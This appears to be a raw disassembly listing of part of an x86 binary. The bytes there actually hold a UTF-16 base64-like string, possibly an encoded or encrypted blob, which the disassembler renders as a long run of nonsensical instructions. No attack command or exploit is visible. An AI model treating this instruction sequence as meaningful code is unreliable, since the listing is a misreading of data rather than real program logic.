  40b901:	68 00 49 00 57       	push   $0x57004900
  40b906:	00 6b 00             	add    %ch,0x0(%ebx)
  40b909:	31 00                	xor    %eax,(%eax)
  40b90b:	78 00                	js     0x40b90d
  40b90d:	76 00                	jbe    0x40b90f
  40b90f:	70 00                	jo     0x40b911
  40b911:	47                   	inc    %edi
  40b912:	00 47 00             	add    %al,0x0(%edi)
  40b915:	31 00                	xor    %eax,(%eax)
  40b917:	56                   	push   %esi
  40b918:	00 56 00             	add    %dl,0x0(%esi)
  40b91b:	41                   	inc    %ecx
  40b91c:	00 77 00             	add    %dh,0x0(%edi)
  40b91f:	48                   	dec    %eax
  40b920:	00 72 00             	add    %dh,0x0(%edx)
  40b923:	48                   	dec    %eax
  40b924:	00 4e 00             	add    %cl,0x0(%esi)
  40b927:	31 00                	xor    %eax,(%eax)
  40b929:	72 00                	jb     0x40b92b
  40b92b:	37                   	aaa
  40b92c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b92f:	7a 00                	jp     0x40b931
  40b931:	41                   	inc    %ecx
  40b932:	00 38                	add    %bh,(%eax)
  40b934:	00 50 00             	add    %dl,0x0(%eax)
  40b937:	35 00 31 00 5a       	xor    $0x5a003100,%eax
  40b93c:	00 48 00             	add    %cl,0x0(%eax)
  40b93f:	6d                   	insl   (%dx),%es:(%edi)
  40b940:	00 2f                	add    %ch,(%edi)
  40b942:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40b946:	00 69 00             	add    %ch,0x0(%ecx)
  40b949:	31 00                	xor    %eax,(%eax)
  40b94b:	65 00 2b             	add    %ch,%gs:(%ebx)
  40b94e:	00 59 00             	add    %bl,0x0(%ecx)
  40b951:	45                   	inc    %ebp
  40b952:	00 70 00             	add    %dh,0x0(%eax)
  40b955:	39 00                	cmp    %eax,(%eax)
  40b957:	79 00                	jns    0x40b959
  40b959:	72 00                	jb     0x40b95b
  40b95b:	7a 00                	jp     0x40b95d
  40b95d:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40b961:	78 00                	js     0x40b963
  40b963:	50                   	push   %eax
  40b964:	00 45 00             	add    %al,0x0(%ebp)
  40b967:	37                   	aaa
  40b968:	00 43 00             	add    %al,0x0(%ebx)
  40b96b:	46                   	inc    %esi
  40b96c:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40b970:	00 45 00             	add    %al,0x0(%ebp)
  40b973:	59                   	pop    %ecx
  40b974:	00 7a 00             	add    %bh,0x0(%edx)
  40b977:	4a                   	dec    %edx
  40b978:	00 6f 00             	add    %ch,0x0(%edi)
  40b97b:	47                   	inc    %edi
  40b97c:	00 78 00             	add    %bh,0x0(%eax)
  40b97f:	38 00                	cmp    %al,(%eax)
  40b981:	35 00 38 00 6f       	xor    $0x6f003800,%eax
  40b986:	00 70 00             	add    %dh,0x0(%eax)
  40b989:	4b                   	dec    %ebx
  40b98a:	00 65 00             	add    %ah,0x0(%ebp)
  40b98d:	7a 00                	jp     0x40b98f
  40b98f:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b993:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b996:	00 72 00             	add    %dh,0x0(%edx)
  40b999:	4b                   	dec    %ebx
  40b99a:	00 4e 00             	add    %cl,0x0(%esi)
  40b99d:	46                   	inc    %esi
  40b99e:	00 43 00             	add    %al,0x0(%ebx)
  40b9a1:	55                   	push   %ebp
  40b9a2:	00 32                	add    %dh,(%edx)
  40b9a4:	00 59 00             	add    %bl,0x0(%ecx)
  40b9a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9a8:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  40b9ac:	00 30                	add    %dh,(%eax)
  40b9ae:	00 76 00             	add    %dh,0x0(%esi)
  40b9b1:	34 00                	xor    $0x0,%al
  40b9b3:	61                   	popa
  40b9b4:	00 75 00             	add    %dh,0x0(%ebp)
  40b9b7:	35 00 57 00 54       	xor    $0x54005700,%eax
  40b9bc:	00 45 00             	add    %al,0x0(%ebp)
  40b9bf:	42                   	inc    %edx
  40b9c0:	00 7a 00             	add    %bh,0x0(%edx)
  40b9c3:	4c                   	dec    %esp
  40b9c4:	00 7a 00             	add    %bh,0x0(%edx)
  40b9c7:	54                   	push   %esp
  40b9c8:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40b9cc:	00 4d 00             	add    %cl,0x0(%ebp)
  40b9cf:	2b 00                	sub    (%eax),%eax
  40b9d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9d2:	00 78 00             	add    %bh,0x0(%eax)
  40b9d5:	6b 00 61             	imul   $0x61,(%eax),%eax
  40b9d8:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40b9dc:	00 30                	add    %dh,(%eax)
  40b9de:	00 70 00             	add    %dh,0x0(%eax)
  40b9e1:	73 00                	jae    0x40b9e3
  40b9e3:	50                   	push   %eax
  40b9e4:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40b9e8:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9eb:	74 00                	je     0x40b9ed
  40b9ed:	71 00                	jno    0x40b9ef
  40b9ef:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40b9f3:	71 00                	jno    0x40b9f5
  40b9f5:	62 00                	bound  %eax,(%eax)
  40b9f7:	61                   	popa
  40b9f8:	00 41 00             	add    %al,0x0(%ecx)
  40b9fb:	71 00                	jno    0x40b9fd
  40b9fd:	32 00                	xor    (%eax),%al
  40b9ff:	68 00 50 00 54       	push   $0x54005000
  40ba04:	00 41 00             	add    %al,0x0(%ecx)
  40ba07:	31 00                	xor    %eax,(%eax)
  40ba09:	68 00 5a 00 4c       	push   $0x4c005a00
  40ba0e:	00 51 00             	add    %dl,0x0(%ecx)
  40ba11:	38 00                	cmp    %al,(%eax)
  40ba13:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40ba17:	4d                   	dec    %ebp
  40ba18:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40ba1c:	00 4a 00             	add    %cl,0x0(%edx)
  40ba1f:	70 00                	jo     0x40ba21
  40ba21:	71 00                	jno    0x40ba23
  40ba23:	73 00                	jae    0x40ba25
  40ba25:	70 00                	jo     0x40ba27
  40ba27:	4c                   	dec    %esp
  40ba28:	00 50 00             	add    %dl,0x0(%eax)
  40ba2b:	70 00                	jo     0x40ba2d
  40ba2d:	2f                   	das
  40ba2e:	00 56 00             	add    %dl,0x0(%esi)
  40ba31:	39 00                	cmp    %eax,(%eax)
  40ba33:	4f                   	dec    %edi
  40ba34:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba37:	51                   	push   %ecx
  40ba38:	00 6b 00             	add    %ch,0x0(%ebx)
  40ba3b:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40ba3f:	77 00                	ja     0x40ba41
  40ba41:	31 00                	xor    %eax,(%eax)
  40ba43:	44                   	inc    %esp
  40ba44:	00 45 00             	add    %al,0x0(%ebp)
  40ba47:	44                   	inc    %esp
  40ba48:	00 30                	add    %dh,(%eax)
  40ba4a:	00 31                	add    %dh,(%ecx)
  40ba4c:	00 50 00             	add    %dl,0x0(%eax)
  40ba4f:	74 00                	je     0x40ba51
  40ba51:	77 00                	ja     0x40ba53
  40ba53:	59                   	pop    %ecx
  40ba54:	00 55 00             	add    %dl,0x0(%ebp)
  40ba57:	45                   	inc    %ebp
  40ba58:	00 45 00             	add    %al,0x0(%ebp)
  40ba5b:	54                   	push   %esp
  40ba5c:	00 49 00             	add    %cl,0x0(%ecx)
  40ba5f:	71 00                	jno    0x40ba61
  40ba61:	41                   	inc    %ecx
  40ba62:	00 2b                	add    %ch,(%ebx)
  40ba64:	00 6f 00             	add    %ch,0x0(%edi)
  40ba67:	46                   	inc    %esi
  40ba68:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40ba6c:	00 71 00             	add    %dh,0x0(%ecx)
  40ba6f:	53                   	push   %ebx
  40ba70:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40ba74:	00 5a 00             	add    %bl,0x0(%edx)
  40ba77:	5a                   	pop    %edx
  40ba78:	00 4e 00             	add    %cl,0x0(%esi)
  40ba7b:	39 00                	cmp    %eax,(%eax)
  40ba7d:	38 00                	cmp    %al,(%eax)
  40ba7f:	30 00                	xor    %al,(%eax)
  40ba81:	69 00 4e 00 4a 00    	imul   $0x4a004e,(%eax),%eax
  40ba87:	70 00                	jo     0x40ba89
  40ba89:	49                   	dec    %ecx
  40ba8a:	00 52 00             	add    %dl,0x0(%edx)
  40ba8d:	4b                   	dec    %ebx
  40ba8e:	00 76 00             	add    %dh,0x0(%esi)
  40ba91:	34 00                	xor    $0x0,%al
  40ba93:	4c                   	dec    %esp
  40ba94:	00 4b 00             	add    %cl,0x0(%ebx)
  40ba97:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba98:	00 59 00             	add    %bl,0x0(%ecx)
  40ba9b:	53                   	push   %ebx
  40ba9c:	00 4b 00             	add    %cl,0x0(%ebx)
  40ba9f:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40baa3:	53                   	push   %ebx
  40baa4:	00 79 00             	add    %bh,0x0(%ecx)
  40baa7:	5a                   	pop    %edx
  40baa8:	00 6f 00             	add    %ch,0x0(%edi)
  40baab:	45                   	inc    %ebp
  40baac:	00 65 00             	add    %ah,0x0(%ebp)
  40baaf:	4f                   	dec    %edi
  40bab0:	00 6e 00             	add    %ch,0x0(%esi)
  40bab3:	52                   	push   %edx
  40bab4:	00 58 00             	add    %bl,0x0(%eax)
  40bab7:	53                   	push   %ebx
  40bab8:	00 2f                	add    %ch,(%edi)
  40baba:	00 56 00             	add    %dl,0x0(%esi)
  40babd:	7a 00                	jp     0x40babf
  40babf:	71 00                	jno    0x40bac1
  40bac1:	6a 00                	push   $0x0
  40bac3:	30 00                	xor    %al,(%eax)
  40bac5:	33 00                	xor    (%eax),%eax
  40bac7:	68 00 58 00 79       	push   $0x79005800
  40bacc:	00 66 00             	add    %ah,0x0(%esi)
  40bacf:	6e                   	outsb  %ds:(%esi),(%dx)
  40bad0:	00 5a 00             	add    %bl,0x0(%edx)
  40bad3:	56                   	push   %esi
  40bad4:	00 6a 00             	add    %ch,0x0(%edx)
  40bad7:	52                   	push   %edx
  40bad8:	00 7a 00             	add    %bh,0x0(%edx)
  40badb:	42                   	inc    %edx
  40badc:	00 75 00             	add    %dh,0x0(%ebp)
  40badf:	2f                   	das
  40bae0:	00 6b 00             	add    %ch,0x0(%ebx)
  40bae3:	6a 00                	push   $0x0
  40bae5:	4e                   	dec    %esi
  40bae6:	00 49 00             	add    %cl,0x0(%ecx)
  40bae9:	31 00                	xor    %eax,(%eax)
  40baeb:	6c                   	insb   (%dx),%es:(%edi)
  40baec:	00 59 00             	add    %bl,0x0(%ecx)
  40baef:	63 00                	arpl   %eax,(%eax)
  40baf1:	52                   	push   %edx
  40baf2:	00 42 00             	add    %al,0x0(%edx)
  40baf5:	62 00                	bound  %eax,(%eax)
  40baf7:	34 00                	xor    $0x0,%al
  40baf9:	72 00                	jb     0x40bafb
  40bafb:	31 00                	xor    %eax,(%eax)
  40bafd:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40bb01:	39 00                	cmp    %eax,(%eax)
  40bb03:	4d                   	dec    %ebp
  40bb04:	00 75 00             	add    %dh,0x0(%ebp)
  40bb07:	79 00                	jns    0x40bb09
  40bb09:	5a                   	pop    %edx
  40bb0a:	00 37                	add    %dh,(%edi)
  40bb0c:	00 47 00             	add    %al,0x0(%edi)
  40bb0f:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40bb13:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40bb17:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40bb1b:	31 00                	xor    %eax,(%eax)
  40bb1d:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40bb21:	41                   	inc    %ecx
  40bb22:	00 47 00             	add    %al,0x0(%edi)
  40bb25:	68 00 79 00 55       	push   $0x55007900
  40bb2a:	00 68 00             	add    %ch,0x0(%eax)
  40bb2d:	68 00 54 00 4f       	push   $0x4f005400
  40bb32:	00 73 00             	add    %dh,0x0(%ebx)
  40bb35:	4e                   	dec    %esi
  40bb36:	00 2b                	add    %ch,(%ebx)
  40bb38:	00 42 00             	add    %al,0x0(%edx)
  40bb3b:	7a 00                	jp     0x40bb3d
  40bb3d:	2f                   	das
  40bb3e:	00 78 00             	add    %bh,0x0(%eax)
  40bb41:	51                   	push   %ecx
  40bb42:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40bb46:	00 35 00 66 00 41    	add    %dh,0x41006600
  40bb4c:	00 4e 00             	add    %cl,0x0(%esi)
  40bb4f:	6d                   	insl   (%dx),%es:(%edi)
  40bb50:	00 62 00             	add    %ah,0x0(%edx)
  40bb53:	77 00                	ja     0x40bb55
  40bb55:	56                   	push   %esi
  40bb56:	00 4b 00             	add    %cl,0x0(%ebx)
  40bb59:	62 00                	bound  %eax,(%eax)
  40bb5b:	61                   	popa
  40bb5c:	00 63 00             	add    %ah,0x0(%ebx)
  40bb5f:	75 00                	jne    0x40bb61
  40bb61:	52                   	push   %edx
  40bb62:	00 63 00             	add    %ah,0x0(%ebx)
  40bb65:	37                   	aaa
  40bb66:	00 41 00             	add    %al,0x0(%ecx)
  40bb69:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb6a:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb6d:	35 00 36 00 6d       	xor    $0x6d003600,%eax
  40bb72:	00 69 00             	add    %ch,0x0(%ecx)
  40bb75:	61                   	popa
  40bb76:	00 45 00             	add    %al,0x0(%ebp)
  40bb79:	4f                   	dec    %edi
  40bb7a:	00 69 00             	add    %ch,0x0(%ecx)
  40bb7d:	67 00 2b             	add    %ch,(%bp,%di)
  40bb80:	00 7a 00             	add    %bh,0x0(%edx)
  40bb83:	63 00                	arpl   %eax,(%eax)
  40bb85:	52                   	push   %edx
  40bb86:	00 6a 00             	add    %ch,0x0(%edx)
  40bb89:	5a                   	pop    %edx
  40bb8a:	00 33                	add    %dh,(%ebx)
  40bb8c:	00 36                	add    %dh,(%esi)
  40bb8e:	00 52 00             	add    %dl,0x0(%edx)
  40bb91:	6a 00                	push   $0x0
  40bb93:	34 00                	xor    $0x0,%al
  40bb95:	71 00                	jno    0x40bb97
  40bb97:	6c                   	insb   (%dx),%es:(%edi)
  40bb98:	00 70 00             	add    %dh,0x0(%eax)
  40bb9b:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40bb9e:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40bba2:	00 4e 00             	add    %cl,0x0(%esi)
  40bba5:	4e                   	dec    %esi
  40bba6:	00 66 00             	add    %ah,0x0(%esi)
  40bba9:	6c                   	insb   (%dx),%es:(%edi)
  40bbaa:	00 43 00             	add    %al,0x0(%ebx)
  40bbad:	73 00                	jae    0x40bbaf
  40bbaf:	34 00                	xor    $0x0,%al
  40bbb1:	74 00                	je     0x40bbb3
  40bbb3:	55                   	push   %ebp
  40bbb4:	00 72 00             	add    %dh,0x0(%edx)
  40bbb7:	44                   	inc    %esp
  40bbb8:	00 52 00             	add    %dl,0x0(%edx)
  40bbbb:	69 00 66 00 43 00    	imul   $0x430066,(%eax),%eax
  40bbc1:	47                   	inc    %edi
  40bbc2:	00 6a 00             	add    %ch,0x0(%edx)
  40bbc5:	4a                   	dec    %edx
  40bbc6:	00 69 00             	add    %ch,0x0(%ecx)
  40bbc9:	4a                   	dec    %edx
  40bbca:	00 68 00             	add    %ch,0x0(%eax)
  40bbcd:	43                   	inc    %ebx
  40bbce:	00 45 00             	add    %al,0x0(%ebp)
  40bbd1:	78 00                	js     0x40bbd3
  40bbd3:	4f                   	dec    %edi
  40bbd4:	00 6b 00             	add    %ch,0x0(%ebx)
  40bbd7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbd8:	00 30                	add    %dh,(%eax)
  40bbda:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  40bbde:	00 78 00             	add    %bh,0x0(%eax)
  40bbe1:	53                   	push   %ebx
  40bbe2:	00 50 00             	add    %dl,0x0(%eax)
  40bbe5:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  40bbe9:	62 00                	bound  %eax,(%eax)
  40bbeb:	78 00                	js     0x40bbed
  40bbed:	37                   	aaa
  40bbee:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bbf1:	6b 00 54             	imul   $0x54,(%eax),%eax
  40bbf4:	00 37                	add    %dh,(%edi)
  40bbf6:	00 48 00             	add    %cl,0x0(%eax)
  40bbf9:	52                   	push   %edx
  40bbfa:	00 32                	add    %dh,(%edx)
  40bbfc:	00 79 00             	add    %bh,0x0(%ecx)
  40bbff:	62 00                	bound  %eax,(%eax)
  40bc01:	63 00                	arpl   %eax,(%eax)
  40bc03:	68 00 79 00 34       	push   $0x34007900
  40bc08:	00 6f 00             	add    %ch,0x0(%edi)
  40bc0b:	47                   	inc    %edi
  40bc0c:	00 6f 00             	add    %ch,0x0(%edi)
  40bc0f:	79 00                	jns    0x40bc11
  40bc11:	2b 00                	sub    (%eax),%eax
  40bc13:	4f                   	dec    %edi
  40bc14:	00 36                	add    %dh,(%esi)
  40bc16:	00 5a 00             	add    %bl,0x0(%edx)
  40bc19:	34 00                	xor    $0x0,%al
  40bc1b:	6a 00                	push   $0x0
  40bc1d:	43                   	inc    %ebx
  40bc1e:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  40bc22:	00 6f 00             	add    %ch,0x0(%edi)
  40bc25:	63 00                	arpl   %eax,(%eax)
  40bc27:	4e                   	dec    %esi
  40bc28:	00 50 00             	add    %dl,0x0(%eax)
  40bc2b:	7a 00                	jp     0x40bc2d
  40bc2d:	2b 00                	sub    (%eax),%eax
  40bc2f:	45                   	inc    %ebp
  40bc30:	00 68 00             	add    %ch,0x0(%eax)
  40bc33:	6c                   	insb   (%dx),%es:(%edi)
  40bc34:	00 30                	add    %dh,(%eax)
  40bc36:	00 78 00             	add    %bh,0x0(%eax)
  40bc39:	4f                   	dec    %edi
  40bc3a:	00 56 00             	add    %dl,0x0(%esi)
  40bc3d:	48                   	dec    %eax
  40bc3e:	00 51 00             	add    %dl,0x0(%ecx)
  40bc41:	75 00                	jne    0x40bc43
  40bc43:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40bc47:	7a 00                	jp     0x40bc49
  40bc49:	42                   	inc    %edx
  40bc4a:	00 4e 00             	add    %cl,0x0(%esi)
  40bc4d:	4b                   	dec    %ebx
  40bc4e:	00 78 00             	add    %bh,0x0(%eax)
  40bc51:	63 00                	arpl   %eax,(%eax)
  40bc53:	7a 00                	jp     0x40bc55
  40bc55:	68 00 2f 00 6c       	push   $0x6c002f00
  40bc5a:	00 6e 00             	add    %ch,0x0(%esi)
  40bc5d:	70 00                	jo     0x40bc5f
  40bc5f:	48                   	dec    %eax
  40bc60:	00 75 00             	add    %dh,0x0(%ebp)
  40bc63:	4a                   	dec    %edx
  40bc64:	00 6e 00             	add    %ch,0x0(%esi)
  40bc67:	6a 00                	push   $0x0
  40bc69:	78 00                	js     0x40bc6b
  40bc6b:	46                   	inc    %esi
  40bc6c:	00 4f 00             	add    %cl,0x0(%edi)
  40bc6f:	6c                   	insb   (%dx),%es:(%edi)
  40bc70:	00 59 00             	add    %bl,0x0(%ecx)
  40bc73:	48                   	dec    %eax
  40bc74:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40bc78:	00 31                	add    %dh,(%ecx)
  40bc7a:	00 38                	add    %bh,(%eax)
  40bc7c:	00 2f                	add    %ch,(%edi)
  40bc7e:	00 4b 00             	add    %cl,0x0(%ebx)
  40bc81:	38 00                	cmp    %al,(%eax)
  40bc83:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc84:	00 6f 00             	add    %ch,0x0(%edi)
  40bc87:	50                   	push   %eax
  40bc88:	00 56 00             	add    %dl,0x0(%esi)
  40bc8b:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40bc8f:	57                   	push   %edi
  40bc90:	00 2b                	add    %ch,(%ebx)
  40bc92:	00 75 00             	add    %dh,0x0(%ebp)
  40bc95:	36 00 32             	add    %dh,%ss:(%edx)
  40bc98:	00 5a 00             	add    %bl,0x0(%edx)
  40bc9b:	57                   	push   %edi
  40bc9c:	00 4b 00             	add    %cl,0x0(%ebx)
  40bc9f:	63 00                	arpl   %eax,(%eax)
  40bca1:	62 00                	bound  %eax,(%eax)
  40bca3:	6e                   	outsb  %ds:(%esi),(%dx)
  40bca4:	00 35 00 71 00 41    	add    %dh,0x41007100
  40bcaa:	00 4f 00             	add    %cl,0x0(%edi)
  40bcad:	4b                   	dec    %ebx
  40bcae:	00 4a 00             	add    %cl,0x0(%edx)
  40bcb1:	2b 00                	sub    (%eax),%eax
  40bcb3:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40bcb7:	44                   	inc    %esp
  40bcb8:	00 33                	add    %dh,(%ebx)
  40bcba:	00 59 00             	add    %bl,0x0(%ecx)
  40bcbd:	58                   	pop    %eax
  40bcbe:	00 62 00             	add    %ah,0x0(%edx)
  40bcc1:	4c                   	dec    %esp
  40bcc2:	00 45 00             	add    %al,0x0(%ebp)
  40bcc5:	49                   	dec    %ecx
  40bcc6:	00 59 00             	add    %bl,0x0(%ecx)
  40bcc9:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40bccd:	72 00                	jb     0x40bccf
  40bccf:	2b 00                	sub    (%eax),%eax
  40bcd1:	46                   	inc    %esi
  40bcd2:	00 37                	add    %dh,(%edi)
  40bcd4:	00 33                	add    %dh,(%ebx)
  40bcd6:	00 46 00             	add    %al,0x0(%esi)
  40bcd9:	74 00                	je     0x40bcdb
  40bcdb:	61                   	popa
  40bcdc:	00 68 00             	add    %ch,0x0(%eax)
  40bcdf:	6a 00                	push   $0x0
  40bce1:	2b 00                	sub    (%eax),%eax
  40bce3:	47                   	inc    %edi
  40bce4:	00 71 00             	add    %dh,0x0(%ecx)
  40bce7:	79 00                	jns    0x40bce9
  40bce9:	62 00                	bound  %eax,(%eax)
  40bceb:	35 00 59 00 30       	xor    $0x30005900,%eax
  40bcf0:	00 4b 00             	add    %cl,0x0(%ebx)
  40bcf3:	74 00                	je     0x40bcf5
  40bcf5:	59                   	pop    %ecx
  40bcf6:	00 51 00             	add    %dl,0x0(%ecx)
  40bcf9:	59                   	pop    %ecx
  40bcfa:	00 57 00             	add    %dl,0x0(%edi)
  40bcfd:	67 00 77 00          	add    %dh,0x0(%bx)
  40bd01:	39 00                	cmp    %eax,(%eax)
  40bd03:	79 00                	jns    0x40bd05
  40bd05:	2f                   	das
  40bd06:	00 46 00             	add    %al,0x0(%esi)
  40bd09:	79 00                	jns    0x40bd0b
  40bd0b:	6c                   	insb   (%dx),%es:(%edi)
  40bd0c:	00 45 00             	add    %al,0x0(%ebp)
  40bd0f:	55                   	push   %ebp
  40bd10:	00 50 00             	add    %dl,0x0(%eax)
  40bd13:	36 00 37             	add    %dh,%ss:(%edi)
  40bd16:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40bd1a:	00 53 00             	add    %dl,0x0(%ebx)
  40bd1d:	51                   	push   %ecx
  40bd1e:	00 63 00             	add    %ah,0x0(%ebx)
  40bd21:	44                   	inc    %esp
  40bd22:	00 30                	add    %dh,(%eax)
  40bd24:	00 6a 00             	add    %ch,0x0(%edx)
  40bd27:	67 00 2f             	add    %ch,(%bx)
  40bd2a:	00 48 00             	add    %cl,0x0(%eax)
  40bd2d:	2f                   	das
  40bd2e:	00 6b 00             	add    %ch,0x0(%ebx)
  40bd31:	49                   	dec    %ecx
  40bd32:	00 33                	add    %dh,(%ebx)
  40bd34:	00 33                	add    %dh,(%ebx)
  40bd36:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd39:	74 00                	je     0x40bd3b
  40bd3b:	68 00 6e 00 54       	push   $0x54006e00
  40bd40:	00 57 00             	add    %dl,0x0(%edi)
  40bd43:	32 00                	xor    (%eax),%al
  40bd45:	79 00                	jns    0x40bd47
  40bd47:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40bd4b:	44                   	inc    %esp
  40bd4c:	00 61 00             	add    %ah,0x0(%ecx)
  40bd4f:	31 00                	xor    %eax,(%eax)
  40bd51:	75 00                	jne    0x40bd53
  40bd53:	32 00                	xor    (%eax),%al
  40bd55:	41                   	inc    %ecx
  40bd56:	00 38                	add    %bh,(%eax)
  40bd58:	00 35 00 31 00 70    	add    %dh,0x70003100
  40bd5e:	00 41 00             	add    %al,0x0(%ecx)
  40bd61:	71 00                	jno    0x40bd63
  40bd63:	78 00                	js     0x40bd65
  40bd65:	5a                   	pop    %edx
  40bd66:	00 46 00             	add    %al,0x0(%esi)
  40bd69:	51                   	push   %ecx
  40bd6a:	00 7a 00             	add    %bh,0x0(%edx)
  40bd6d:	74 00                	je     0x40bd6f
  40bd6f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd70:	00 79 00             	add    %bh,0x0(%ecx)
  40bd73:	4c                   	dec    %esp
  40bd74:	00 66 00             	add    %ah,0x0(%esi)
  40bd77:	35 00 77 00 58       	xor    $0x58007700,%eax
  40bd7c:	00 46 00             	add    %al,0x0(%esi)
  40bd7f:	2b 00                	sub    (%eax),%eax
  40bd81:	6c                   	insb   (%dx),%es:(%edi)
  40bd82:	00 46 00             	add    %al,0x0(%esi)
  40bd85:	2f                   	das
  40bd86:	00 6e 00             	add    %ch,0x0(%esi)
  40bd89:	37                   	aaa
  40bd8a:	00 75 00             	add    %dh,0x0(%ebp)
  40bd8d:	78 00                	js     0x40bd8f
  40bd8f:	37                   	aaa
  40bd90:	00 76 00             	add    %dh,0x0(%esi)
  40bd93:	31 00                	xor    %eax,(%eax)
  40bd95:	71 00                	jno    0x40bd97
  40bd97:	4f                   	dec    %edi
  40bd98:	00 43 00             	add    %al,0x0(%ebx)
  40bd9b:	67 00 44 00          	add    %al,0x0(%si)
  40bd9f:	6b 00 46             	imul   $0x46,(%eax),%eax
  40bda2:	00 4a 00             	add    %cl,0x0(%edx)
  40bda5:	35 00 6b 00 64       	xor    $0x64006b00,%eax
  40bdaa:	00 49 00             	add    %cl,0x0(%ecx)
  40bdad:	56                   	push   %esi
  40bdae:	00 70 00             	add    %dh,0x0(%eax)
  40bdb1:	54                   	push   %esp
  40bdb2:	00 76 00             	add    %dh,0x0(%esi)
  40bdb5:	7a 00                	jp     0x40bdb7
  40bdb7:	6a 00                	push   $0x0
  40bdb9:	63 00                	arpl   %eax,(%eax)
  40bdbb:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40bdbf:	4b                   	dec    %ebx
  40bdc0:	00 72 00             	add    %dh,0x0(%edx)
  40bdc3:	2f                   	das
  40bdc4:	00 72 00             	add    %dh,0x0(%edx)
  40bdc7:	79 00                	jns    0x40bdc9
  40bdc9:	71 00                	jno    0x40bdcb
  40bdcb:	34 00                	xor    $0x0,%al
  40bdcd:	51                   	push   %ecx
  40bdce:	00 7a 00             	add    %bh,0x0(%edx)
  40bdd1:	50                   	push   %eax
  40bdd2:	00 71 00             	add    %dh,0x0(%ecx)
  40bdd5:	31 00                	xor    %eax,(%eax)
  40bdd7:	31 00                	xor    %eax,(%eax)
  40bdd9:	42                   	inc    %edx
  40bdda:	00 31                	add    %dh,(%ecx)
  40bddc:	00 36                	add    %dh,(%esi)
  40bdde:	00 78 00             	add    %bh,0x0(%eax)
  40bde1:	6a 00                	push   $0x0
  40bde3:	62 00                	bound  %eax,(%eax)
  40bde5:	4f                   	dec    %edi
  40bde6:	00 4e 00             	add    %cl,0x0(%esi)
  40bde9:	58                   	pop    %eax
  40bdea:	00 39                	add    %bh,(%ecx)
  40bdec:	00 37                	add    %dh,(%edi)
  40bdee:	00 56 00             	add    %dl,0x0(%esi)
  40bdf1:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40bdf5:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40bdf9:	45                   	inc    %ebp
  40bdfa:	00 31                	add    %dh,(%ecx)
  40bdfc:	00 41 00             	add    %al,0x0(%ecx)
  40bdff:	4e                   	dec    %esi
  40be00:	00 5a 00             	add    %bl,0x0(%edx)
  40be03:	6b 00 42             	imul   $0x42,(%eax),%eax
  40be06:	00 37                	add    %dh,(%edi)
  40be08:	00 4e 00             	add    %cl,0x0(%esi)
  40be0b:	45                   	inc    %ebp
  40be0c:	00 41 00             	add    %al,0x0(%ecx)
  40be0f:	73 00                	jae    0x40be11
  40be11:	4a                   	dec    %edx
  40be12:	00 52 00             	add    %dl,0x0(%edx)
  40be15:	32 00                	xor    (%eax),%al
  40be17:	37                   	aaa
  40be18:	00 31                	add    %dh,(%ecx)
  40be1a:	00 6f 00             	add    %ch,0x0(%edi)
  40be1d:	35 00 63 00 6e       	xor    $0x6e006300,%eax
  40be22:	00 41 00             	add    %al,0x0(%ecx)
  40be25:	50                   	push   %eax
  40be26:	00 2b                	add    %ch,(%ebx)
  40be28:	00 6f 00             	add    %ch,0x0(%edi)
  40be2b:	43                   	inc    %ebx
  40be2c:	00 35 00 32 00 66    	add    %dh,0x66003200
  40be32:	00 32                	add    %dh,(%edx)
  40be34:	00 77 00             	add    %dh,0x0(%edi)
  40be37:	63 00                	arpl   %eax,(%eax)
  40be39:	72 00                	jb     0x40be3b
  40be3b:	6a 00                	push   $0x0
  40be3d:	4e                   	dec    %esi
  40be3e:	00 65 00             	add    %ah,0x0(%ebp)
  40be41:	57                   	push   %edi
  40be42:	00 72 00             	add    %dh,0x0(%edx)
  40be45:	59                   	pop    %ecx
